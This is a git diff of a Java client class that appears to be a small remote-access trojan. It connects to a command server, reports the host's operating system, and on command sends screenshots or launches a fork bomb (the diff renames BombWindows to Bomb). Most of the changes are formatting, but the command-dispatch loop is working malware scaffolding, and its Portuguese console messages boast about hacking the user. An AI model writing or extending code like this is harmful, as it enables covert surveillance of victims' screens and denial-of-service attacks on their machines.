@@ -1,15 +1,15 @@
 package app;
 
+import java.io.IOException;
+import java.net.Socket;
+
 import exception.ServerOfflineException;
 import network.Connection;
 import network.Message;
-import utils.forkbomb.BombWindows;
 import utils.ClientUtils;
 import utils.OsCheck;
 import utils.ScreenUtils;
-
-import java.io.IOException;
-import java.net.Socket;
+import utils.forkbomb.Bomb;
 
 public class Client {
     static Connection connection;
@@ -18,10 +18,10 @@ public class Client {
 
     public static void main(String[] args) {
         System.out.println("Opa ta na hora de ser haskiado");
-        while (true) {
+        while(true) {
             try {
                 beginConnection();
-            } catch (ServerOfflineException e) {
+            } catch(ServerOfflineException e) {
                 System.out.println("Server desligou agora negao");
             }
         }
@@ -32,7 +32,7 @@ public class Client {
             connection = new Connection(new Socket("localhost", 27015));
             isConnected = true;
             System.out.println("Connected, boii");
-        } catch (IOException e) {
+        } catch(IOException e) {
             System.out.println("Server is offline");
             disconnected();
             return;
@@ -43,16 +43,15 @@ public class Client {
         Message osMessage = new Message("print", "User is using " + MY_OS.name());
         connection.sendMessage(osMessage);
 
-        while (true) {
+        while(true) {
             handleServerCommand();
         }
-
     }
 
     private static void handleServerCommand() throws ServerOfflineException {
         String command = connection.readMessage().getCommand();
 
-        switch (command) {
+        switch(command) {
             case "screen":
                 ScreenUtils.sendScreenshot(connection, false);
                 break;
@@ -64,8 +63,8 @@ public class Client {
                 break;
             case "bomb":
                 try {
-                    BombWindows.explode(MY_OS);
-                } catch (IOException e) {
+                    Bomb.explode(MY_OS);
+                } catch(IOException e) {
                     connection.sendMessage(new Message("print", "ForkBomb failed: " + e.getMessage()));
                 }
                 break;
